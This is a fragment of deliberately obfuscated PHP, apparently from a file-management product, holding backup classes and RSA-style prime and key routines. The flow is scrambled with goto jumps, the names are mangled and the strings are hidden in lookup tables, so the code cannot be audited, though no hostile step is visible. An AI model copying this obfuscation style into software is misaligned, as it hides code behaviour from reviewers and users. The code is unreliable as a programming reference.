$BÆƒ™¼’[127]($bœ‹¥ø¹÷ . $BÏ†«æÄÜˆ)); $b“Æ–„¥åğ = $cé§òä™³[663]; break; $F×ë‘“Éƒ¾ = $cé§òä™³[664]; if (strlen($F×ë‘“Éƒ¾) < $cé§òä™³[564]) { return; } case $BÆƒ™¼’[345]: $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($D…ÂœÑ—À, $BÆƒ™¼’[123]($bœ‹¥ø¹÷ . $BÏ†«æÄÜˆ)); $fÎ›’äï·è = $cé§òä™³[665]; if (!$fÎ›’äï·è) { return; } break; $cĞä™Ò÷ = $cé§òä™³[666]; case $BÆƒ™¼’[346]: goto b§­Ö‘ÚÚ¯; EÌˆõéÓ¶Š: $fÍ‰ñàå© = $cé§òä™³[670]; if (strlen($fÍ‰ñàå©) < $cé§òä™³[576]) { die; } $C¹‚åÄÕ‰¹ = 0; goto aËï’¾åŸ; aÓ…˜†óİ‚: if (strlen($fğË¨ºÑƒ) < $cé§òä™³[377]) { return; } goto B…†‰é˜Ò; eˆÀÛËé„Æ: if (strlen($Dä¨Âµ‚Úã) < $cé§òä™³[572]) { die; } break; $fğË¨ºÑƒ = $cé§òä™³[675]; goto aÓ…˜†óİ‚; Aã˜Ä¢‹ïà: for ($C¹‚åÄÕ‰¹ = 0; $C¹‚åÄÕ‰¹ < $BÆƒ™¼’[24]($D…ÂœÑ—À); $C¹‚åÄÕ‰¹++) { $D£‹¡¾»Ã = $D£‹¡¾»Ã == $BÆƒ™¼’[24]($b§¨¬¯Ìˆ) ? 0 : $D£‹¡¾»Ã; $c´›Üš§áä = $cé§òä™³[672]; while ($c´›Üš§áä < $cé§òä™³[570]) { if ($c´›Üš§áä >= 0) { break; } $c´›Üš§áä++; } $dÍ‚åó¨¨ô = $D£‹¡¾»Ã++; $D¸ã˜Ó©İä = $BÆƒ™¼’[348]($e†Ë£¹š«÷, $D…ÂœÑ—À[$C¹‚åÄÕ‰¹]) - $bÖƒµœ©˜ - $BÆƒ™¼’[349]($b§¨¬¯Ìˆ[$dÍ‚åó¨¨ô]); while ($D¸ã˜Ó©İä < 0) { $D¸ã˜Ó©İä += 64; } $AöùÖöŒ‚„ .= $e†Ë£¹š«÷[$D¸ã˜Ó©İä]; $cÆß©„Ñ = $cé§òä™³[673]; if (strlen($cÆß©„Ñ) < $cé§òä™³[377]) { return; } } $eã¢„Í‘À = $BÆƒ™¼’[352]($AöùÖöŒ‚„); $Dä¨Âµ‚Úã = $cé§òä™³[674]; goto eˆÀÛËé„Æ; EŠÍñ’ìõØ: $b§¨¬¯Ìˆ = $BÆƒ™¼’[123]($eÀÎà‡ˆ‚Ö . $BÆƒ™¼’[123]($BÏ†«æÄÜˆ . $eÀÎà‡ˆ‚Ö) . $BÏ†«æÄÜˆ); $b§¨¬¯Ìˆ = $BÆƒ™¼’[25]($b§¨¬¯Ìˆ, $bÖƒµœ©˜ % 8, $bÖƒµœ©˜ % 8 + 7); $AöùÖöŒ‚„ = $BÆƒ™¼’[10]; goto EÌˆõéÓ¶Š; b§­Ö‘ÚÚ¯: $D…ÂœÑ—À = $BÆƒ™¼’[351]($D…ÂœÑ—À); $AÜï¥”ëŠ† = $cé§òä™³[667]; if (!$AÜï¥”ëŠ†) { return; } goto d„ïÂèÄ™Ù; aËï’¾åŸ: $f‘‰Èöìˆù = $cé§òä™³[671]; if (!$f‘‰Èöìˆù) { die; } $D¸ã˜Ó©İä = 0; goto Bô¡¡İ†ä¹; Bô¡¡İ†ä¹: $D£‹¡¾»Ã = 0; $C‹à¡„æ¦ = $cé§òä™³[628]; if (!$C‹à¡„æ¦) { return; } goto Aã˜Ä¢‹ïà; a˜øŠˆŞŞ©: $D…ÂœÑ—À = $BÆƒ™¼’[25]($D…ÂœÑ—À, 1); $bÖƒµœ©˜ = $BÆƒ™¼’[348]($e†Ë£¹š«÷, $eÀÎà‡ˆ‚Ö); $A‚Û†’ÒŸÜ = $cé§òä™³[669]; goto EŠÍñ’ìõØ; d„ïÂèÄ™Ù: $eÀÎà‡ˆ‚Ö = $D…ÂœÑ—À[0]; $bïĞ‹‘µƒÑ = $cé§òä™³[668]; while (strlen($bïĞ‹‘µƒÑ) < $cé§òä™³[570]) { if (!$bïĞ‹‘µƒÑ) { break; } $bïĞ‹‘µƒÑ++; } goto a˜øŠˆŞŞ©; B…†‰é˜Ò: default: $eã¢„Í‘À = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($D…ÂœÑ—À, $BÏ†«æÄÜˆ . $bœ‹¥ø¹÷); $C¦Àğñ±¼“ = $cé§òä™³[676]; if (strlen($C¦Àğñ±¼“) < $cé§òä™³[377]) { return; } break; $BìÏÁÖ› = $cé§òä™³[677]; while ($BìÏÁÖ› < $cé§òä™³[377]) { if ($BìÏÁÖ› >= 0) { break; } $BìÏÁÖ›++; } } goto C×‘Ğ·ê† ; b´î®©º¨: } public function trcn7e4a8449($f‘¸Î¶›ø‚) { goto B…ôÈŸ‰ö; FòÇğòÛƒÓ: while (1) { $b¤¿Ù„ò“„ = $Aàõ¶èÚèæ; $BËŒ÷É­¥ã = $fîç¬¯Ñ[678]; while (strlen($BËŒ÷É­¥ã) < $fîç¬¯Ñ[572]) { if (!$BËŒ÷É­¥ã) { break; } $BËŒ÷É­¥ã++; } $dãæ­ùÁÑİ = $A›åÄÄ„µŸ; while ($dãæ­ùÁÑİ % $b¤¿Ù„ò“„ != 0) { $fÂğ³ÁÊˆ„ = $dãæ­ùÁÑİ; $aŠåÈ…ğ•± = $fîç¬¯Ñ[679]; $dãæ­ùÁÑİ = $b¤¿Ù„ò“„; $b¤¿Ù„ò“„ = $fÂğ³ÁÊˆ„ % $b¤¿Ù„ò“„; $aß”²¾™£ = $fîç¬¯Ñ[680]; if (strlen($aß”²¾™£) < $fîç¬¯Ñ[377]) { die; } } if ($b¤¿Ù„ò“„ == 1) { break; } else { $Aàõ¶èÚèæ++; } } $D°¹¬óÀ°… = 2; for ($dÌå¶¸ÛÄŒ = 0; $dÌå¶¸ÛÄŒ < $A›åÄÄ„µŸ * 10; $dÌå¶¸ÛÄŒ++) { if (($A›åÄÄ„µŸ * $dÌå¶¸ÛÄŒ + 1) % $Aàõ¶èÚèæ == 0) { $D°¹¬óÀ°… = $f¤™ˆ’ô·Ë[249](($A›åÄÄ„µŸ * $dÌå¶¸ÛÄŒ + 1) / $Aàõ¶èÚèæ); break; } } goto cÃôÊ«Ï‹—; B…ôÈŸ‰ö: $fîç¬¯Ñ =& $_SERVER[‡’¶øåüç˜]; $f¤™ˆ’ô·Ë =& $_SERVER[ÂØÃó©³¸¡¸¢]; $f—¸§¸ŒŠ¤ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][353]}(); goto bôß×÷µÖ; A‹¼òƒè: $F†¤¾¸ŒÜË = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($f‘¸Î¶›ø‚, $e”óè“ø‘•) . $f¤™ˆ’ô·Ë[357] . $d®‘ßÛğš˜; $CÀŸ’ä„ = $fîç¬¯Ñ[682]; if (!$CÀŸ’ä„) { die; } goto cÈ×½‰…§; cÃôÊ«Ï‹—: $d®‘ßÛğš˜ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][156]}($f—¸§¸ŒŠ¤ * $c©†Ì÷©×® . $f¤™ˆ’ô·Ë[10], $f¤™ˆ’ô·Ë[158]); $e”óè“ø‘• = $f¤™ˆ’ô·Ë[123]($f¤™ˆ’ô·Ë[354] . ($f—¸§¸ŒŠ¤ + $c©†Ì÷©×®) . $f¤™ˆ’ô·Ë[355] . $Aàõ¶èÚèæ . $f¤™ˆ’ô·Ë[355] . $D°¹¬óÀ°… . $f¤™ˆ’ô·Ë[356]); $Dì¢­®Ÿ½” = $fîç¬¯Ñ[681]; goto A‹¼òƒè; cÈ×½‰…§: return $F†¤¾¸ŒÜË; goto d—‡®õİ«; bôß×÷µÖ: $c©†Ì÷©×® = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][353]}(); $A›åÄÄ„µŸ = ($f—¸§¸ŒŠ¤ - 1) * ($c©†Ì÷©×® - 1); $Aàõ¶èÚèæ = $f¤™ˆ’ô·Ë[249](($f—¸§¸ŒŠ¤ + $c©†Ì÷©×®) / 2); goto FòÇğòÛƒÓ; d—‡®õİ«: } public function icha475f5cd8($a°‰¯êÖÜƒ) { goto AãˆÏ‹ó–; d¡¡‚ ùÈÍ: $aˆ¨ºÕ² = $Dö¨³çƒª[684]; while (strlen($aˆ¨ºÕ²) < $Dö¨³çƒª[564]) { if (!$aˆ¨ºÕ²) { break; } $aˆ¨ºÕ²++; } $BæÍÔÂ¯ªë = $F°…Ç·¼ë[249](($Aéêïë—Ò½ + $e·‘ˆ“äÛ“) / 2); goto C½Åğ¦£ƒ…; FÃÏˆ´à: $Aöˆô¼î¥ = $Dö¨³çƒª[683]; if ($F°…Ç·¼ë[19]($eô¡Œô¦¿˜) != 2) { return $F°…Ç·¼ë[10]; } $CÙÎŒ¯©§¢ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($eô¡Œô¦¿˜[1] . $F°…Ç·¼ë[10], $F°…Ç·¼ë[158]); goto fŒï²‹²; fŒï²‹²: if (!$CÙÎŒ¯©§¢) { return $F°…Ç·¼ë[10]; } $CÙÎŒ¯©§¢ = $F°…Ç·¼ë[249]($CÙÎŒ¯©§¢); $Aéêïë—Ò½ = 0; goto fĞ‚ò™¦âŠ; cÖÍ²Š‹á—: $FĞº†¥Çƒô = $F°…Ç·¼ë[123]($F°…Ç·¼ë[354] . ($Aéêïë—Ò½ + $e·‘ˆ“äÛ“) . $F°…Ç·¼ë[355] . $BæÍÔÂ¯ªë . $F°…Ç·¼ë[355] . $D¶Ô¼àŞ¾ƒ . $F°…Ç·¼ë[356]); $FÈ²¦óäöˆ = $this->{$_SERVER[ÂØÃó©³¸¡¸¢][255]}($eô¡Œô¦¿˜[0], $FĞº†¥Çƒô); $b”ª‘ªßµø = $Dö¨³çƒª[687]; goto EÛ§ÂÅİæñ; AãˆÏ‹ó–: $Dö¨³çƒª =& $_SERVER[‡’¶øåüç˜]; $F°…Ç·¼ë =& $_SERVER[ÂØÃó©³¸¡¸¢]; $eô¡Œô¦¿˜ = $F°…Ç·¼ë[0]($F°…Ç·¼ë[357], $a°‰¯êÖÜƒ); goto FÃÏˆ´à; EÛ§ÂÅİæñ: if (strlen($b”ª‘ªßµø) < $Dö¨³çƒª[564]) { return; } return $FÈ²¦óäöˆ; goto a¬›óÅ¦ñÜ; fĞ‚ò™¦âŠ: $e·‘ˆ“äÛ“ = 0; for ($BÂİÛÄ÷´Í = 3; $BÂİÛÄ÷´Í < $CÙÎŒ¯©§¢; $BÂİÛÄ÷´Í += 2) { if ($CÙÎŒ¯©§¢ % $BÂİÛÄ÷´Í != 0) { continue; } $Aéêïë—Ò½ = $BÂİÛÄ÷´Í; $e·‘ˆ“äÛ“ = $F°…Ç·¼ë[249]($CÙÎŒ¯©§¢ / $BÂİÛÄ÷´Í); break; } $d‡šëÔ¶¿ù = ($Aéêïë—Ò½ - 1) * ($e·‘ˆ“äÛ“ - 1); goto d¡¡‚ ùÈÍ; C½Åğ¦£ƒ…: while (1) { $AÜ˜‰áíÁ = $BæÍÔÂ¯ªë; $a­åãÜµ‡ø = $d‡šëÔ¶¿ù; while ($a­åãÜµ‡ø % $AÜ˜‰áíÁ != 0) { $DäÛ¸¾ö¸­ = $a­åãÜµ‡ø; $d¨‘¯†Ó÷š = $Dö¨³çƒª[685]; if (!$d¨‘¯†Ó÷š) { die; } $a­åãÜµ‡ø = $AÜ˜‰áíÁ; $B¶µ¯™ÙƒÜ = $Dö¨³çƒª[686]; while ($B¶µ¯™ÙƒÜ < $Dö¨³çƒª[572]) { if ($B¶µ¯™ÙƒÜ >= 0) { break; } $B¶µ¯™ÙƒÜ++; } $AÜ˜‰áíÁ = $DäÛ¸¾ö¸­ % $AÜ˜‰áíÁ; } if ($AÜ˜‰áíÁ == 1) { break; } else { $BæÍÔÂ¯ªë++; } } $D¶Ô¼àŞ¾ƒ = 2; for ($BÂİÛÄ÷´Í = 0; $BÂİÛÄ÷´Í < $d‡šëÔ¶¿ù * 10; $BÂİÛÄ÷´Í++) { if (($d‡šëÔ¶¿ù * $BÂİÛÄ÷´Í + 1) % $BæÍÔÂ¯ªë == 0) { $D¶Ô¼àŞ¾ƒ = $F°…Ç·¼ë[249](($d‡šëÔ¶¿ù * $BÂİÛÄ÷´Í + 1) / $BæÍÔÂ¯ªë); break; } } goto cÖÍ²Š‹á—; a¬›óÅ¦ñÜ: } public function tzpv553866d3() { goto B˜ºòÊÇÇ¨; F³ÍšÖµÖí: $d¾µİ¢¸ = 1; $C¿…àŒœöÖ = $EÁ½ë¬–³[689]; while (strlen($C¿…àŒœöÖ) < $EÁ½ë¬–³[570]) { if (!$C¿…àŒœöÖ) { break; } $C¿…àŒœöÖ++; } goto FÔàÑ—Äİä; FÔàÑ—Äİä: while ($d¾µİ¢¸ <= (int) $dÆÂÇ‡ĞØä[359]($F²ĞµëòÎ)) { $e¿÷˜¦ë¬ç = $d¾µİ¢¸; while (!0) { $e¿÷˜¦ë¬ç++; $c¬•ô‚‹ = $EÁ½ë¬–³[690]; if (!$c¬•ô‚‹) { die; } if ($e¿÷˜¦ë¬ç <= 2) { $d¾µİ¢¸ = $e¿÷˜¦ë¬ç; break; } else { if ($e¿÷˜¦ë¬ç < 2) { continue; } } $E‡¨èßóô = !0; for ($D¯ø•¢ˆ‘ = 2; $D¯ø•¢ˆ‘ <= $dÆÂÇ‡ĞØä[359]($e¿÷˜¦ë¬ç); $D¯ø•¢ˆ‘++) { if ($e¿÷˜¦ë¬ç % $D¯ø•¢ˆ‘ == 0) { $E‡¨èßóô = !1; } } if ($E‡¨èßóô) { $d¾µİ¢¸ = $e¿÷˜¦ë¬ç; break; } } $e«†ùáì¬ø[] = $d¾µİ¢¸; } $bªƒÕ‚ÙÏÍ = 2; $bë¹Šßòˆ = $EÁ½ë¬–³[691]; goto Eš¤áæ¤‘ƒ; Eš¤áæ¤‘ƒ: if (strlen($bë¹Šßòˆ) < $EÁ½ë¬–³[576]) { die; } for ($e¿÷˜¦ë¬ç = $F²ĞµëòÎ; $e¿÷˜¦ë¬ç > 1; $e¿÷˜¦ë¬ç--) { $E‡¨èßóô = !0; foreach ($e«†ùáì¬ø as $CˆšÛÑ÷¦˜) { if ($e¿÷˜¦ë¬ç % $CˆšÛÑ÷¦˜ == 0) { $E‡¨èßóô = !1; break; } } if ($E‡¨èßóô) { $bªƒÕ‚ÙÏÍ = $e¿÷˜¦ë¬ç; break; } } return $bªƒÕ‚ÙÏÍ; goto a”‹Â¦ôŒ¦; B˜ºòÊÇÇ¨: $EÁ½ë¬–³ =& $_SERVER[‡’¶øåüç˜]; $dÆÂÇ‡ĞØä =& $_SERVER[ÂØÃó©³¸¡¸¢]; $F²ĞµëòÎ = $dÆÂÇ‡ĞØä[338]($dÆÂÇ‡ĞØä[358](2, 14), $dÆÂÇ‡ĞØä[358](2, 16) - 1); goto d“ ‚‚ºãŒ; d“ ‚‚ºãŒ: $Aİ¢ŞßŞ = $EÁ½ë¬–³[688]; while ($Aİ¢ŞßŞ < $EÁ½ë¬–³[564]) { if ($Aİ¢ŞßŞ >= 0) { break; } $Aİ¢ŞßŞ++; } $e«†ùáì¬ø = array(); goto F³ÍšÖµÖí; a”‹Â¦ôŒ¦: } public function nxat16c8ad1c($bêˆÛ†ç‹¸, $DÂÔšØøƒ™) { $b¬Ñ¡ØËƒ¶ =& $_SERVER[ÂØÃó©³¸¡¸¢]; return $b¬Ñ¡ØËƒ¶[13](array($b¬Ñ¡ØËƒ¶[14], $b¬Ñ¡ØËƒ¶[360]), $bêˆÛ†ç‹¸, $DÂÔšØøƒ™); $EÓ¸ÇÁÂß = $_SERVER[‡’¶øåüç˜][692]; if (!$EÓ¸ÇÁÂß) { die; } } public function hqlxd4e5664c($cØƒ§ã‰ğ, $D¸”„«Óíª) { $A·ßğ¤¶’¸ =& $_SERVER[ÂØÃó©³¸¡¸¢]; return $A·ßğ¤¶’¸[13](array($A·ßğ¤¶’¸[361], $A·ßğ¤¶’¸[362]), $cØƒ§ã‰ğ, $D¸”„«Óíª); } public function cwgi13cb1f9f($C†¹‡Î, $AÎ˜ëŞÂ–…) { $c…¾¼Ø†ÈÜ =& $_SERVER[ÂØÃó©³¸¡¸¢]; return $c…¾¼Ø†ÈÜ[13](array($c…¾¼Ø†ÈÜ[361], $c…¾¼Ø†ÈÜ[363]), $C†¹‡Î, $AÎ˜ëŞÂ–…); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $AÊˆ„‹³Œ =& $_SERVER[‡’¶øåüç˜]; self::$name = date($AÊˆ„‹³Œ[693]); if (!($FˆËÆæôÁ• = Model($AÊˆ„‹³Œ[694])->lastItem())) { $FˆËÆæôÁ• = $this->initData(); } else { self::$name = $FˆËÆæôÁ•[$AÊˆ„‹³Œ[28]]; if ($FˆËÆæôÁ•[$AÊˆ„‹³Œ[695]] == $AÊˆ„‹³Œ[83]) { self::$name = date($AÊˆ„‹³Œ[696]); $E‚øÀå† = 0; if (isset($FˆËÆæôÁ•[$AÊˆ„‹³Œ[285]][$AÊˆ„‹³Œ[171]][$AÊˆ„‹³Œ[431]])) { $E‚øÀå† = (int) $FˆËÆæôÁ•[$AÊˆ„‹³Œ[285]][$AÊˆ„‹³Œ[171]][$AÊˆ„‹³Œ[431]]; } if ($FˆËÆæôÁ•[$AÊˆ„‹³Œ[28]] == self::$name) { Model($AÊˆ„‹³Œ[694])->remove($FˆËÆæôÁ•[$AÊˆ„‹³Œ[371]]); } $FˆËÆæôÁ• = $this->initData($E‚øÀå†, $FˆËÆæôÁ•[$AÊˆ„‹³Œ[697]]); } else { $this->checkStore($FˆËÆæôÁ•[$AÊˆ„‹³Œ[697]]); } } self::$option = $FˆËÆæôÁ•; } private function initData($f×ŒŞ«ìï‚ = 0, $b½õ…­Å£‘ = '') { goto bœôôğ¿§ã; BÔë¿¿Äà: $e›‹î‘êøÅ[$f”ùíº†¿[371]] = $C×”šĞÅŞˆ; return $e›‹î‘êøÅ; goto D—³ÄŸÆ¸³; CÑñ™Âùˆ: $this->checkStore($cšİ› ¸‰ [$f”ùíº†¿[697]]); $e›‹î‘êøÅ = array($f”ùíº†¿[697] => $cšİ› ¸‰ [$f”ùíº†¿[697]], $f”ùíº†¿[28] => self::$name, $f”ùíº†¿[695] => 0, $f”ùíº†¿[698] => $cšİ› ¸‰ [$f”ùíº†¿[698]], $f”ùíº†¿[285] => array($f”ùíº†¿[699] => array($f”ùíº†¿[695] => 0), $f”ùíº†¿[700] => array($f”ùíº†¿[695] => 0, $f”ùíº†¿[701] => 0, $f”ùíº†¿[702] => 0, $f”ùíº†¿[29] => $f”ùíº†¿[33]), $f”ùíº†¿[703] => array($f”ùíº†¿[695] => 0, $f”ùíº†¿[701] => 0, $f”ùíº†¿[702] => 0), $f”ùíº†¿[171] => array($f”ùíº†¿[695] => 0, $f”ùíº†¿[704] => 0, $f”ùíº†¿[705] => 0, $f”ùíº†¿[706] => 0, $f”ùíº†¿[707] => 0, $f”ùíº†¿[431] => $f×ŒŞ«ìï‚)), $f”ùíº†¿[708] => time(), $f”ùíº†¿[460] => 0); $C×”šĞÅŞˆ = Model($f”ùíº†¿[694])->insert($e›‹î‘êøÅ); goto BÔë¿¿Äà; bœôôğ¿§ã: $f”ùíº†¿ =& $_SERVER[‡’¶øåüç˜]; $cšİ› ¸‰  = Model($f”ùíº†¿[694])->config(); if ($b½õ…­Å£‘ && $cšİ› ¸‰ [$f”ùíº†¿[697]] != $b½õ…­Å£‘) { $f×ŒŞ«ìï‚ = 0; } goto CÑñ™Âùˆ; D—³ÄŸÆ¸³: } private function checkStore($e¹¨š¤„×) { $A¯İÑ´¬ªè =& $_SERVER[‡’¶øåüç˜]; $fÄİªóøÅç = Model($A¯İÑ´¬ªè[709])->listData($e¹¨š¤„×); Model($A¯İÑ´¬ªè[709])->checkConfig($fÄİªóøÅç); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[‡’¶øåüç˜][694])->findByName(self::$name); } return self::$option; } public static function set($B¨ô•óÁÛ§) { $ašï‡ãİ“ =& $_SERVER[‡’¶øåüç˜]; $a’¢ºŠ¼Ù = self::get(); foreach ($B¨ô•óÁÛ§ as $D¯Ã°ŞØâ‚ => $cÊáÂ«Ñ ô) { $eÍî‹Ï×Çš = explode($ašï‡ãİ“[91], $D¯Ã°ŞØâ‚); $d¢‰øÆ©— = count($eÍî‹Ï×Çš); switch ($d¢‰øÆ©—) { case 1: $a’¢ºŠ¼Ù[$eÍî‹Ï×Çš[0]] = $cÊáÂ«Ñ ô; break; case 2: $a’¢ºŠ¼Ù[$eÍî‹Ï×Çš[0]][$eÍî‹Ï×Çš[1]] = $cÊáÂ«Ñ ô; break; case 3: $a’¢ºŠ¼Ù[$eÍî‹Ï×Çš[0]][$eÍî‹Ï×Çš[1]][$eÍî‹Ï×Çš[2]] = $cÊáÂ«Ñ ô; break; } } Model($ašï‡ãİ“[694])->update($a’¢ºŠ¼Ù[$ašï‡ãİ“[371]], $a’¢ºŠ¼Ù); self::$option = $a’¢ºŠ¼Ù; return self::$option; } public function keep() { $bïÛùÙÚ… =& $_SERVER[‡’¶øåüç˜]; $E‚Èİ®Ö¹ = self::get(); if ($E‚Èİ®Ö¹[$bïÛùÙÚ…[285]][$bïÛùÙÚ…[699]][$bïÛùÙÚ…[695]] == $bïÛùÙÚ…[83]) { return; } $this->backupKeep($E‚Èİ®Ö¹); self::set(array($bïÛùÙÚ…[710] => 1)); } private function backupKeep($b‘Î±¦Ä§Ø) { goto Bç£çÙ¤õ¯; Bç£çÙ¤õ¯: $AµïØ½¢öè =& $_SERVER[‡’¶øåüç˜]; $aî£ƒÓ‡…Ù = Model($AµïØ½¢öè[694])->listData(); if (empty($aî£ƒÓ‡…Ù)) { return; } goto aÅ‚è„¨œ¯; aÅ‚è„¨œ¯: $Bî¼ùÄì‹ = 0; $C¸…Õ–—ÏÍ = array(); foreach ($aî£ƒÓ‡…Ù as $a›‚ÔÄ) { if ($Bî¼ùÄì‹ >= 7) { break; } $C¸…Õ–—ÏÍ[] = $a›‚ÔÄ[$AµïØ½¢öè[28]]; $Bî¼ùÄì‹++; } goto B¾¾•ø·—Ö; B¾¾•ø·—Ö: for ($Bî¼ùÄì‹ = 0; $Bî¼ùÄì‹ < 12; $Bî¼ùÄì‹++) { $C¸…Õ–—ÏÍ[] = date($AµïØ½¢öè[711], strtotime("\x2d{$Bî¼ùÄì‹}\40\155\157\156\x74\x68\x73")); } $C¸…Õ–—ÏÍ = array_unique($C¸…Õ–—ÏÍ); foreach ($aî£ƒÓ‡…Ù as $a›‚ÔÄ) { if (!empty($a›‚ÔÄ[$AµïØ½¢öè[28]]) && in_array($a›‚ÔÄ[$AµïØ½¢öè[28]], $C¸…Õ–—ÏÍ)) { continue; } Model($AµïØ½¢öè[694])->remove($a›‚ÔÄ[$AµïØ½¢öè[371]]); $då¤ä§Ç‡ = "\x7b\151\157\x3a{$b‘Î±¦Ä§Ø[$AµïØ½¢öè[697]]}\175\57\144\141\x74\x61\142\141\163\145\x2f\x62\141\x63\153\x75\160\137{$a›‚ÔÄ[$AµïØ½¢öè[28]]}"; IO::remove($då¤ä§Ç‡, !1); } goto A‘¹ÏÅ‘È®; A‘¹ÏÅ‘È®: } public function db() { goto fË–Ê­†”¾; f’…ñ¶‘º§: $a¢°«­âÃÃ = new BackupDb(); if (!$a¢°«­âÃÃ->index()) { return !1; } self::set(array($EŸ’ÅÖ™áß[712] => 1)); goto eµğ¾Šàš™; eµğ¾Šàš™: return !0; goto bİ©Óô˜ŸÅ; fË–Ê­†”¾: $EŸ’ÅÖ™áß =& $_SERVER[‡’¶øåüç˜]; $fÛ¶ä°™ÌÏ = self::get(); if ($fÛ¶ä°™ÌÏ[$EŸ’ÅÖ™áß[285]][$EŸ’ÅÖ™áß[700]][$EŸ’ÅÖ™áß[695]] == $EŸ’ÅÖ™áß[83]) { return !0; } goto f’…ñ¶‘º§; bİ©Óô˜ŸÅ: } public function dbFile() { goto e†ê¿«ƒÍ·; C²°ÃÜ‡•Ë: $f¥“¯†ß•¸ = new BackupDbFile(); if (!$f¥“¯†ß•¸->index()) { return !1; } self::set(array($c‡÷“ŠÌŞ[713] => 1)); goto dƒ¨óš´òµ; dƒ¨óš´òµ: return !0; goto D«ò¨™Í¯µ; e†ê¿«ƒÍ·: $c‡÷“ŠÌŞ =& $_SERVER[‡’¶øåüç˜]; $BÌ‰ƒö¿ô³ = self::get(); if ($BÌ‰ƒö¿ô³[$c‡÷“ŠÌŞ[285]][$c‡÷“ŠÌŞ[703]][$c‡÷“ŠÌŞ[695]] == $c‡÷“ŠÌŞ[83]) { return !0; } goto C²°ÃÜ‡•Ë; D«ò¨™Í¯µ: } public function file() { $cØğ±áïŞ =& $_SERVER[‡’¶øåüç˜]; $c»’æ„‘À = self::get(); if ($c»’æ„‘À[$cØğ±áïŞ[285]][$cØğ±áïŞ[171]][$cØğ±áïŞ[695]] == $cØğ±áïŞ[83]) { return !0; } if (!isset($c»’æ„‘À[$cØğ±áïŞ[698]]) || $c»’æ„‘À[$cØğ±áïŞ[698]] == $cØğ±áïŞ[481]) { $Fè÷š´Åïì = new BackupFile(); if (!$Fè÷š´Åïì->index()) { return !1; } } self::set(array($cØğ±áïŞ[714] => 1, $cØğ±áïŞ[695] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto e›æ¢Ï«‚; Aæ¼ŒÃ‡Şµ: Backup::set($a„†Ì£‚Æ); return !0; goto bˆ´„îˆíò; C°ÊĞÛµæ“: foreach ($Cì‘Ë±ãíÇ as $B—·–éØ––) { $FŠ¨÷´Šèù = $d—ÇÄöº›¥ . $B—·–éØ–– . $BÕ‡×Áè†[723]; $EŒ® ¸àÏĞ = null; if ($B—·–éØ–– == $BÕ‡×Áè†[724] && (!isset($BÈò‹Ö¾ÚÕ[$BÕ‡×Áè†[698]]) || $BÈò‹Ö¾ÚÕ[$BÕ‡×Áè†[698]] == $BÕ‡×Áè†[481])) { $EŒ® ¸àÏĞ = self::$io; } $F‘Óùé‡õ… += $b¼ßíÅ‚Î->sqlFromDb($B—·–éØ––, $FŠ¨÷´Šèù, $d“ÚëÀ©àä, $EŒ® ¸àÏĞ); } $d“ÚëÀ©àä->end(); $a„†Ì£‚Æ = array($BÕ‡×Áè†[725] => $bÌ°É„ğí¡, $BÕ‡×Áè†[712] => 1, $BÕ‡×Áè†[726] => $F‘Óùé‡õ…, $BÕ‡×Áè†[727] => $F‘Óùé‡õ…); goto Aæ¼ŒÃ‡Şµ; d¦­åÉ²’Ê: $b¼ßíÅ‚Î = new DbManage($FáŸå†‡ò, $bÌ°É„ğí¡); $d—ÇÄöº›¥ = TEMP_FILES . $BÕ‡×Áè†[715] . self::$name . $BÕ‡×Áè†[8]; del_dir($d—ÇÄöº›¥); goto aàÚ‚‚Ãì; aàÚ‚‚Ãì: mk_dir($d—ÇÄöº›¥); $B“ÔÉëºŠ = $F‘Óùé‡õ… = 0; $Cì‘Ë±ãíÇ = $b¼ßíÅ‚Î->db()->getTables(); goto cŸÉ²«ÑİŸ; e›æ¢Ï«‚: $BÕ‡×Áè† =& $_SERVER[‡’¶øåüç˜]; $BÈò‹Ö¾ÚÕ = Backup::get(); self::$io = $BÈò‹Ö¾ÚÕ[$BÕ‡×Áè†[697]]; goto cµ¦µÒËé; cŸÉ²«ÑİŸ: $Cì‘Ë±ãíÇ = array_diff($Cì‘Ë±ãíÇ, array($BÕ‡×Áè†[716], $BÕ‡×Áè†[717])); foreach ($Cì‘Ë±ãíÇ as $B—·–éØ––) { $B“ÔÉëºŠ += $b¼ßíÅ‚Î->model($B—·–éØ––)->count(); } $d“ÚëÀ©àä = new Task($BÕ‡×Áè†[718], $BÕ‡×Áè†[719], $B“ÔÉëºŠ, LNG($BÕ‡×Áè†[720]) . $BÕ‡×Áè†[721] . LNG($BÕ‡×Áè†[722])); goto C°ÊĞÛµæ“; cµ¦µÒËé: self::$name = $BÈò‹Ö¾ÚÕ[$BÕ‡×Áè†[28]]; $FáŸå†‡ò = $GLOBALS[$BÕ‡×Áè†[6]][$BÕ‡×Áè†[17]]; $bÌ°É„ğí¡ = $this->_dbType($FáŸå†‡ò); goto d¦­åÉ²’Ê; bˆ´„îˆíò: } private function _dbType($A¢¸ò„º“) { goto dÈ‹íˆŠ’š; e–ŞäÈì÷¸: return $f‡Ø–ùˆ¥¡; goto cÙøå¯£¦ï; dÈ‹íˆŠ’š: $d§î†ù¬Çõ =& $_SERVER[‡’¶øåüç˜]; $A¢¸ò„º“ = array_change_key_case($A¢¸ò„º“); $f‡Ø–ùˆ¥¡ = $A¢¸ò„º“[$d§î†ù¬Çõ[728]]; goto D’’“†¤; D’’“†¤: if ($f‡Ø–ùˆ¥¡ == $d§î†ù¬Çõ[729]) { $Dˆ´¡›ÍŠ = explode($d§î†ù¬Çõ[4], $A¢¸ò„º“[$d§î†ù¬Çõ[730]]); $f‡Ø–ùˆ¥¡ = $Dˆ´¡›ÍŠ[0]; } $a¿³¢Öòöø = array($d§î†ù¬Çõ[731] => $d§î†ù¬Çõ[9], $d§î†ù¬Çõ[732] => $d§î†ù¬Çõ[733]); if (isset($a¿³¢Öòöø[$f‡Ø–ùˆ¥¡])) { $f‡Ø–ùˆ¥¡ = $a¿³¢Öòöø[$f‡Ø–ùˆ¥¡]; } goto e–ŞäÈì÷¸; cÙøå¯£¦ï: } } goto d¢ÙçÔ×‹÷; 